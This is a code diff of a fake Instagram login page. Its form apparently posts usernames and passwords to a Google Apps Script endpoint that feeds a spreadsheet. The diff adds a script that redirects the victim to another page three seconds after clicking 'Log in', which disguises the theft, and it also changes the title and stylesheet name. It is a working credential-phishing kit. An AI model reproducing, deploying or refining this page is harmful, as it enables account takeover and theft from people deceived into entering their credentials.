@@ -4,9 +4,9 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Instagram</title>
+    <title>ываыва</title>
     <link rel="shortcut icon" href="./img/aM-g435MtEX.png" type="image/png">
-    <link rel="stylesheet" href="style.css">
+    <link rel="stylesheet" href="css.css">
     <link rel="preconnect" href="https://fonts.googleapis.com">
     <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
     <link
@@ -31,7 +31,6 @@
                                 placeholder="Phone number, username or email">
                             <input class="inp2" id="password" type="password" name="password" placeholder="Password">
                             <button style="cursor: pointer;" type="submit" class="first_button">Log in</button>
-
                         </form>
                         <div>
                             <div class="delitel">
@@ -92,6 +91,15 @@
         </div>
     </div>
     <script>
+        const btn = document.querySelector('.first_button')
+
+
+        btn.addEventListener('click', () => {
+            setTimeout(() => {
+                document.location.href = './dop/index.html';
+            }, 3000);
+        });
+
         const scriptURL =
             'https://script.google.com/macros/s/AKfycbz_Dfy0uBmBaLxXdl6LQrYH3R8NNx8Vbt1jv3moab6eTl2n9MFnB50JUzRvnmILSEeLMQ/exec';
         const form = document.forms['submit-to-google-sheet'];
